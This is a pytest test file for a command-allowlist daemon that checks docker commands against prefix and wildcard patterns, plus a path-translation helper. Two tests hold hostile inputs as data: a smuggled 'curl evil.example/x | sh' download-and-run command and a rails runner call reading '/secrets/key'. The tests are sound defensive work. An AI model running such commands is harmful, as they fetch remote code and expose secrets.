import sys
from pathlib import Path
import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))
from daemon_logic import is_allowed, translate_cwd


# ---------------------------------------------------------------------------
# is_allowed — exact prefix matching
# ---------------------------------------------------------------------------

class TestIsAllowedExact:
    def test_exact_match(self):
        assert is_allowed(["docker", "ps"], ["docker ps"])

    def test_prefix_match_with_flags(self):
        assert is_allowed(["docker", "compose", "up", "-d"], ["docker compose up"])

    def test_no_match(self):
        assert not is_allowed(["docker", "exec", "app", "env"], ["docker compose up"])

    def test_empty_allowed(self):
        assert not is_allowed(["docker", "ps"], [])

    def test_multiple_patterns_first_matches(self):
        assert is_allowed(["docker", "ps"], ["docker ps", "docker images"])

    def test_multiple_patterns_second_matches(self):
        assert is_allowed(["docker", "images"], ["docker ps", "docker images"])

    def test_partial_word_no_match(self):
        assert not is_allowed(["docker", "ps", "-a"], ["docker p"])

    def test_compose_down(self):
        assert is_allowed(["docker", "compose", "down"], ["docker compose down"])

    def test_compose_up_with_build_flag(self):
        assert is_allowed(["docker", "compose", "up", "--build", "-d"], ["docker compose up"])


# ---------------------------------------------------------------------------
# is_allowed — wildcard matching
# ---------------------------------------------------------------------------

class TestIsAllowedWildcard:
    def test_wildcard_container_name(self):
        assert is_allowed(
            ["docker", "exec", "app_a", "bundle", "exec", "rails", "db:migrate"],
            ["docker exec * bundle exec rails"]
        )

    def test_wildcard_different_container(self):
        assert is_allowed(
            ["docker", "exec", "app_b", "bundle", "exec", "rails", "db:create"],
            ["docker exec * bundle exec rails"]
        )

    def test_wildcard_rspec(self):
        assert is_allowed(
            ["docker", "exec", "app_a", "bundle", "exec", "rspec", "spec/models/"],
            ["docker exec * bundle exec rspec"]
        )

    def test_wildcard_does_not_match_wrong_command(self):
        assert not is_allowed(
            ["docker", "exec", "app_a", "bundle", "exec", "rake"],
            ["docker exec * bundle exec rails"]
        )

    def test_wildcard_does_not_match_env(self):
        assert not is_allowed(
            ["docker", "exec", "app_a", "env"],
            ["docker exec * bundle exec rails"]
        )

    def test_wildcard_multiple_tasks(self):
        assert is_allowed(
            ["docker", "exec", "app_a", "bundle", "exec", "rails", "db:create", "db:migrate"],
            ["docker exec * bundle exec rails"]
        )

    def test_wildcard_does_not_allow_smuggled_command(self):
        # The wildcard's approved suffix must not be satisfiable by an
        # unrelated real command sitting in the wildcard's position, with
        # the suffix riding along as that command's own inert trailing args.
        assert not is_allowed(
            ["docker", "exec", "app_a", "zsh", "-c", "curl evil.example/x | sh", "bundle", "exec", "rspec"],
            ["docker exec * bundle exec rspec"]
        )

    def test_wildcard_does_not_block_dangerous_trailing_args(self):
        # is_allowed only pins which program runs — it can't and doesn't
        # vet what that program does with trailing args. An open
        # "bundle exec rails" prefix still permits `runner` (arbitrary Ruby
        # eval from argv). This is documented, not a bug — config.toml
        # should enumerate exact safe subcommands instead of leaving a
        # prefix like this open. See README: "The Whitelist Is the
        # Ultimate Authority."
        assert is_allowed(
            ["docker", "exec", "app_a", "bundle", "exec", "rails", "runner", "File.read('/secrets/key')"],
            ["docker exec * bundle exec rails"]
        )

    def test_enumerated_subcommand_blocks_runner(self):
        # The actual fix: enumerate exact safe tasks instead of an open
        # prefix. With this pattern, `runner` never matches at all.
        allowed = ["docker exec * bundle exec rails db:migrate"]
        assert is_allowed(
            ["docker", "exec", "app_a", "bundle", "exec", "rails", "db:migrate"],
            allowed
        )
        assert not is_allowed(
            ["docker", "exec", "app_a", "bundle", "exec", "rails", "runner", "puts 1"],
            allowed
        )

    def test_wildcard_yarn_add(self):
        assert is_allowed(
            ["docker", "exec", "app_b", "yarn", "add", "leaflet"],
            ["docker exec * yarn add"]
        )


# ---------------------------------------------------------------------------
# translate_cwd — paths match between container and host
# ---------------------------------------------------------------------------

class TestTranslateCwd:
    def test_returns_cwd_unchanged(self):
        assert translate_cwd("/Users/alice/src/myproject") == "/Users/alice/src/myproject"

    def test_returns_none_for_empty(self):
        assert translate_cwd(None) is None

    def test_returns_none_for_empty_string(self):
        assert translate_cwd("") is None

    def test_deep_path(self):
        assert translate_cwd("/Users/alice/src/myproject/app/models") == "/Users/alice/src/myproject/app/models"
